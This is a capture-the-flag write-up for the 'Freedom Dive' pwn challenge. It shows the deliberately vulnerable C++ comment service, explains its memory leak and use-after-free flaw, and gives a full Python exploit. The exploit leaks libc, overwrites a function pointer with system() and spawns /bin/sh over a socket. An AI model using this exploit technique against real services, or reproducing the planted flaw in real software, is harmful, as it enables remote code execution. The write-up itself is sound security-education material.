## [Pwn] Freedom Dive (250)

**freedom_dive.cpp**
```c++
// Mitigation : ASLR, NX, SSP
// compile : g++ -fPIC -fstack-protector-all --param ssp-buffer-size=4 -o freedom_dive freedom_dive.cpp -m32

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef class userProfile {
public:
	char username[36];
	char comment[216];
	void (*cleanMemory)(void *);
	void init(){
		cleanMemory = free;
	}
} Profile;

void welcome();
void echoService();
void displayMenu();
void setProfile(Profile *);
void showProfile(Profile *);
void modifyProfile(Profile *);
void deleteProfile(Profile *);
void quit(Profile *);

int flag;

int main(int argc, char *argv[])
{
	setvbuf(stdout, 0, 2, 0);
	char name[12] = {0,};
	puts("[*] Please input your name");
	read(0, name, 10);
	welcome();
	flag = 0;
	Profile *p;
	unsigned int sel;
	while(true)
	{
		displayMenu();
		scanf("%d", &sel);
		switch(sel){
			case 0:
				echoService();
				break;
			case 1:
				if(flag == 0) p = (Profile *)malloc(256);
				setProfile(p);
				break;
			case 2:
				if(flag == 0){
					puts("[*] Please set the profile first!!");
					break;
				}
				showProfile(p);
				break;
			case 3:
				if(flag == 0){
					puts("[*] Please set the profile first!!");
					break;
				}
				modifyProfile(p);
				break;
			case 4:
				if(flag == 0){
					puts("[*] Please set the profile first!!");
					break;
				}
				deleteProfile(p);
				break;
			case 5:
				quit(p);
				break;
			default:
				puts("[*] No such command!!");
				break;
		}
	}
}

void welcome(){
	puts("\n   ============== Comment Service ==============");
	puts("   Welcome to my comment service!");
	puts("   It's wonderful service, but incompleted :(");
	puts("   So, It allows you use only one account.");
	puts("   Please be fun with my service!");
	puts("   =============================================\n");
}

void echoService(){
	char *echoMessage = (char *)malloc(256);
	puts("[*] Input Message : ");
	read(0, echoMessage, 256);
	puts("[*] Echo");
	puts(echoMessage);
	free(echoMessage);
}

void displayMenu(){
	puts("========== Menu ==========");
	puts("0. Echo service");
	puts("1. Set Profile");
	puts("2. Show Profile");
	puts("3. Modify Profile");
	puts("4. Delete Profile");
	puts("5. Exit");
	puts("[Select menu]");
}

void setProfile(Profile *pro){
	pro->init();
	puts("[*] Input Name");
	read(0, pro->username, 36);
	puts("[*] Input Description");
	read(0, pro->comment, 216);
	flag++;
}

void showProfile(Profile *pro){
	puts("[username]");
	puts(pro->username);
	puts("[comment]");
	puts(pro->comment);
}

void modifyProfile(Profile *pro){
	int num;
	showProfile(pro);
	puts("============================");
	puts("[*] Input name");
	num = read(0, pro->username, 36);
	pro->username[num] = '\0';
	puts("[*] Input Description");
	num = read(0, pro->comment, 216);
	pro->comment[num] = '\0';
	puts("============================");
}

void deleteProfile(Profile *pro){
	pro->cleanMemory(pro);
	flag--;
}

void quit(Profile *pro){
	exit(0);
}
```

The vulnerability can be found easily.
You can easily find the leak vulnerability, because all of string input in **setProfile** use **read** function and it exactly same with name and comment's size.  
Because the variable **flag** is checked whether it is 1 or not, you can allocate memory two times or more.  
Furthermore, function **deleteProfile()** free the memory and decrease flag only 1.  
In addition, **echoService** in menu 0 use Memory exactly 256 bytes which is same with **Profile** class's size.  
So, you can use **Use After Free Bug** by allocatiog twice and selecting menu 0, **echoService**.  

As the **deleteProfile()** calls the function pointer in the **Profile** class, you can overwrite it.
So, Exploit route is as follows.
`Menu 1 => Menu 1 => Menu 2(Leak) => Menu 4 => Menu 0 => Overwrite Pointer => Menu 4 (Trigger)`

You can find the offset between free and system using the leak vulnerability.
So you can overwrite the function pointer with system function's library address.


Exploit code is as follows.
```python
import telnetlib
from hackutil import *
from socket import *
from time import *

#========================
HOST = '45.55.163.13'
PORT = 9000
offset_free_system = 0x37d30
#========================

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((HOST, PORT))
 
print sock.recv(1024)
sock.send('5kyc1ad')
sock.recv(1024)

for i in range(2):
	sock.send('1\n')
	sleep(0.1)
	sock.recv(1024)

	sock.send('5kyc1ad_Dummy')
	sleep(0.1)
	sock.recv(1024)

	sock.send('A'*216) # For memory Leak - free() library function
	sleep(0.1)
	sock.recv(1024)

sock.send('2\n')
sleep(0.1)
sock.recv(1024)
data = sock.recv(2048)

free_lib = up32(data[data.find('A'*216)+216:data.find('A'*216)+220])[0]
system_lib = free_lib - offset_free_system
print "[*] Find free@lib : " + str(hex(free_lib))
print "[*] Offset [free - system] : " + str(hex(offset_free_system))
print "[*] Find system@lib : " + str(hex(system_lib))

sock.send('4\n')
sleep(0.1)
sock.recv(1024)

sock.send('0\n')
sleep(0.1)
sock.recv(1024)

payload = '/bin/sh\x00'+'A'*244+p32(system_lib)

sock.send(payload)
sleep(0.1)
print "[*] Payload injected : " + str(len(payload)) + " bytes"
sock.recv(1024)

sock.send('4\n')
print hexdump(sock.recv(1024))
print "=============== [*] Got the shell ==============="
t = telnetlib.Telnet()
t.sock = sock
t.interact()
```